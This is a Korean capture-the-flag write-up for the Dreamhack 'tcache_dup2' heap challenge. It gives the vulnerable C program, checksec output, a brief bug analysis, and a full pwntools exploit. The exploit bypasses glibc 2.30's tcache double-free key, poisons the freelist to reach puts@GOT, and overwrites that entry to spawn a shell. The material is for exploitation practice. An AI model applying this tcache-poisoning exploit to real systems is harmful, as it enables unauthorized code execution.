```c
// Name: tcache_dup2.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}
```

```bash
$ checksec ./tcache_dup2
[*] './tcache_dup2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 코드 분석

* `tcache_dup2.c:13-29` : `malloc` 함수로 청크를 할당하고 메모리 영역을 초기화하지 않으므로 use after free가 발생할 가능성이 있다.
* `tcache_dup2.c:31-48` : 할당해둔 청크의 데이터를 최대 `0x10` 바이트 수정할 수 있다.
* `tcache_dup2.c:50-62` : `free` 함수로 청크를 해제하고 포인터를 초기화하지 않아 dangling pointer가 발생하며, 따라서 double free bug가 발생할 가능성이 있다.
* `tcache_dup2.c:64-66` : 호출하는 것만으로 shell을 탈취할 수 있다.

# 공격

이번 문제도 기본적으로는 "tcache_dup"과 같은 방식으로 접근하면 풀 수 있다.
다만, "tcache_dup"과는 달리, `libc`의 버전이 `2.30`이므로 key값을 변조하지 않으면 double free를 할 수 없다.
따라서 double free를 하기 전 `modify_heap()`을 통해 key값을 변조하는 작업을 추가로 진행해주기만 하면 크게 어렵지 않게 풀 수 있다.

다음과 같이 익스플로잇 코드를 구성하면 flag를 얻을 수 있다.

```python
# Name: tcache_dup2.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 12397

p = remote(HOST,PORT) # remote
# p = process('./tcache_dup2', env={'LD_PRELOAD':'./libc-2.30.so'}) # local
e = ELF('./tcache_dup2')

# context.log_level = 'debug'

#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_
def create_heap(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def modify_heap(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete_heap(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
#endif /* __Custom_Functions_For_Convenience_ */

#ifndef __Custom_Global_Variables_For_Convenience_
#define __Custom_Global_Variables_For_Convenience_
dummy = b'A'
puts_got = e.got['puts']
get_shell = e.symbols['get_shell']
#endif /* __Custom_Global_Variables_For_Convenience_ */

# Initial tcache is empty
# tcache[0x20]: empty

# tcache[0x20]: Chunk A -> Chunk A
create_heap(0x10, dummy)
delete_heap(0) # tcache[0x20].append(Chunk A)
modify_heap(0, 0x10, dummy * 9) # Bypassing the DFB mitigation
delete_heap(0) # tcache[0x20].append(Chunk A)

# tcache[0x20]: puts@got -> ...
modify_heap(0, 0x10, p64(puts_got) + b'\x00') # tcache[0x20].first().set_fd(puts_got) & Bypassing the DFB mitigation
create_heap(0x10, dummy) # tcache[0x20].pop()

# Overwrite puts@got
create_heap(0x10, p64(get_shell))

p.interactive()
```